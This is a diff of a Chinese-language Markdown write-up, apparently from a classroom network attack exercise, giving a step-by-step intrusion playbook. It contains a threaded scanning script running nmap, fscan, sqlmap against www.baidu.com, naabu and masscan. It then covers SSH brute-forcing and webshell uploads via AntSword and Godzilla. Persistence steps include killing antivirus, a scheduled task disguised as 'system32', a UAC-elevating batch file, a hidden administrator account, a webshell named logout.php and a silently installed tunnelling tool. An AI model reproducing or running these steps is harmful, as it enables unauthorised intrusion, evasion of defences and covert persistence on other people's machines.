@@ -94,41 +94,55 @@ procdump.exe
   - shell工具:`蚁剑`,`Godzilla`
   - 其它:`Python3.12`(版本不限),`pycharm`,`procdump`,`010Editor`,`todesk安装包`
 
-> 扫描
+### 扫描
 
 ```python
-import os
 import subprocess
+import threading
 
-# base_ip = "192.168.71."
+# TODO:生成ip.txt,方便后续操作
 base_ip = input("请输入需要生成的起始ip地址(例如192.168.71.*):")
-last_num = int(base_ip.rsplit('.', 1)[-1])  # 获取最后一个数字 *
-base_ip = base_ip.rsplit('.', 1)[0] + '.'  # 获取除了最后一个数字的部分 192.168.71.
+last_num = int(base_ip.rsplit('.', 1)[-1])  # TODO:获取最后一个数字 *
+base_ip = base_ip.rsplit('.', 1)[0] + '.'  # TODO:获取除了最后一个数字的部分 192.168.71. 然后进行拼接得到新的ip
 ips = [base_ip + str(i) for i in range(last_num, 255)]
-# 写入文件
-with open("C:/Users/24937/Desktop/ip.txt", "w") as f:
+# TODO:写入文件
+with open("C:/Users/24937/Desktop/ip2.txt", "w") as f:  # TODO:这里用w实现覆盖,避免重复运行时ip重复
     for ip in ips:
         print(ip)
-        f.write(ip + "/n")
-print('写入成功!!!')
-#
-# print(subprocess.run("ipconfig", capture_output=True, encoding='gbk'))
-os.system("nmap -sV 192.168.71.0/24")
-os.system("fscan.exe -hf C://Users//24937//Desktop//ip.txt -p 80,8080,22,3306,6379,3389,1433,445")
+        f.write(ip + "\n")
+print('写入成功 >_<')
+# TODO:把需要的用到的命令写入到列表,可以自定义
+cmds = [
+    'nmap -iL C:\\Users\\24937\\Desktop\\ip2.txt -p 80,8080,22,3306,6379,3389,1433,445 -sV -O',
+    'fscan.exe -hf C:\\Users\\24937\\Desktop\\ip2.txt -p 80,8080,22,3306,6379,3389,1433,445',
+    'sqlmap -u "www.baidu.com" --batch --random-agent --threads 10 --level 3 --risk 3 --banner --dbs --batch',
+    'D:\\naabu\\naabu.exe -host 192.168.41.145 -p 1-65535',
+    'D:\\masscan\\masscan.exe --ports 1-65535 192.168.41.145'
+]
+# TODO:使用多线程,这里用subprocess,因为os不好用,容易卡
+threads = []
+for cmd in cmds:
+    # TODO:这里使用了个匿名函数lamda,把cmd传进去
+    thread = threading.Thread(target=lambda c=cmd: subprocess.run(c, shell=True, check=True))
+    threads.append(thread)
+    thread.start()
+for thread in threads:
+    thread.join()
+print("所有命令执行完毕 >_<")
 
-# os.system("D://naabu//naabu.exe -host 192.168.71.21 -p 1-65535")
-# os.system("D://masscan//masscan.exe --ports 1-65535 192.168.71.21")
 ```
 
 <img src="./assets/image-20240921102157340.png" alt="image-20240921102157340" style="zoom: 25%;" />
 
-<img src="./assets/image-20240921102058594.png" alt="image-20240921102058594" style="zoom: 50%;" />
+![image-20240923220150060](./assets/image-20240923220150060.png)
 
 <img src="./assets/image-20240921102032742.png" alt="image-20240921102032742" style="zoom: 25%;" />
 
-![image-20240921103136208](./assets/image-20240921103136208.png)
+<img src="./assets/image-20240921103136208.png" alt="image-20240921103136208" style="zoom: 50%;" />
 
-> 22端口(ssh)
+
+
+### 22端口(ssh)
 
 - `ssh`爆破
 - ![image-20240921143957747](./assets/image-20240921143957747.png)
@@ -146,18 +160,19 @@ os.system("fscan.exe -hf C://Users//24937//Desktop//ip.txt -p 80,8080,22,3306,63
 
 ![image-20240921145438677](./assets/image-20240921145438677.png)
 
-- 然后`嘻嘻不嘻嘻`,`reboot`一下,对面`已关机`
-- `为什么关机又关机?`
+> 然后`嘻嘻不嘻嘻`,`reboot`一下,对面`已关机`
+>
+> `为什么关机又关机?`
 
 ![image-20240921150034753](./assets/image-20240921150034753.png)
 
 ------
 
-> 3306端口 (mysql)
+### 3306端口 (mysql)
 
-![image-20240921150653252](./assets/image-20240921150653252.png)
+<img src="./assets/image-20240921150653252.png" alt="image-20240921150653252" style="zoom: 67%;" />
 
-![image-20240921150748552](./assets/image-20240921150748552.png)
+<img src="./assets/image-20240921150748552.png" alt="image-20240921150748552" style="zoom: 50%;" />
 
 - 这个端口可以使用`into outfile`写shell(得知道绝对路径),大多数同学用的是`8.0`的版本,没有写的权限
 
@@ -165,4 +180,103 @@ os.system("fscan.exe -hf C://Users//24937//Desktop//ip.txt -p 80,8080,22,3306,63
 
 
 
-> 1443端口(sqlserver)
+### 1443端口(sqlserver)
+
+> 1. **SQL 注入**：
+>    - 如果有 Web 应用程序与 SQL Server 后端交互，可以通过 SQL 注入漏洞执行恶意 SQL 查询，获取敏感信息或执行任意命令。
+>    - 可以尝试利用 SQL 注入上传 WebShell。
+> 2. **弱口令**：尝试使用暴力破解工具或字典攻击，测试常用或默认的用户名(`sa`)和密码。
+> 3. **上传 WebShell**：如果 SQL Server 允许文件上传（例如，某些存储过程）
+> 4. 因为之间做的时候忘记截图了,所以没有素材
+>
+
+------
+
+
+
+### 80端口(http)
+
+![image-20240923225002070](./assets/image-20240923225002070.png)
+
+![image-20240923225053741](./assets/image-20240923225053741.png)
+
+> 状态码`200`的就访问看看
+>
+> 如果扫描到`shell`,那就直接`爆破shell`
+>
+> 没有扫到就找网页各种漏洞getshell,`文件上传`,`sql注入`,`文件包含`等等..
+
+------
+
+
+
+> 善意的脚本编写
+
+<img src="./assets/image-20240923230241800.png" alt="image-20240923230241800" style="zoom:33%;" />
+
+```cmd
+#使用命令将py文件打包成exe
+pyinstaller -F --noconsle 美女黑丝.py
+```
+
+![image-20240923230045676](./assets/image-20240923230045676.png)
+
+> 通过`蚁剑`连接,上传 exe 文件(蚁剑上传`速度快`)
+>
+> 如果上传`失败`,可以使用python开一个端口,使用`wget`下载
+>
+> 紧接着传一个`大马`过去,使用`Godzilla连接`,找到他的`index`目录,将自己的`shell`名字修改为`index`方便下一次直接来
+>
+> 把它能开的`服务全打开`,什么`3389`,`8080`,`1433`,`3306`越多越好,没有的给它`传一个`
+>
+> 进入`命令行工具`,使用`taskkill`命令把杀毒软件给关了
+
+<img src="./assets/image-20240818152835850.png" alt="image-20240818152835850" style="zoom:33%;" />
+
+> 最后效果是这样
+
+![image-20240923230938493](./assets/image-20240923230938493.png)
+
+> 娱乐完了,不要忘了添加一个定时计划任务,先把`目录`摸索完,确定`apache`里的`httpd.exe`的位置
+
+- ```php
+  //安装服务
+  "E:\php_study\app\phpstudy_pro\Extensions\Apache2.4.39\bin\httpd.exe" -k install
+  //启动服务
+  schtasks /create /tn "system32" /tr "C:\Users\24937\Desktop\system32.bat" /sc onstart /f
+  ```
+
+  > 手动编写`bat`批处理命令,命令为`system32.bat`,需要和上面的位置对应,可以藏深点
+
+- ```bat
+  @echo off
+  net session >nul 2>&1
+  if %errorLevel% neq 0 (
+      powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
+      exit /b
+  )
+  sc query Apache2.4 | findstr /i "RUNNING" >nul || (sc config Apache2.4 start= auto & start sc start Apache2.4)
+  exit
+  ```
+
+  > 这样就能实现开机自启动`apache`服务,最后使用命令创建一个用户
+
+- ```
+  net user hcak hack /add
+  net localgroup administrators hack /add
+  net localgroup "Remote Desktop Users" hack /add
+  ```
+
+> 最后如果觉得还不够,那就再创建一个`html`
+
+- ![image-20240923232136206](./assets/image-20240923232136206.png)
+
+![image-20240923232213484](./assets/image-20240923232213484.png)
+
+> 最好命名看起来不被怀疑,例如`logout.php`,不仔细看很难发现
+
+> 可以做个内网穿透,下载一个`花生壳`,静默安装,找到`bin`文件夹里的`exe`文件挂后台执行即可(同样的道理,开机自启动)
+
+![image-20240923232543195](./assets/image-20240923232543195.png)
+
+> --------------------------------------------->到此整个故事就结束了<-------------------------------------------------
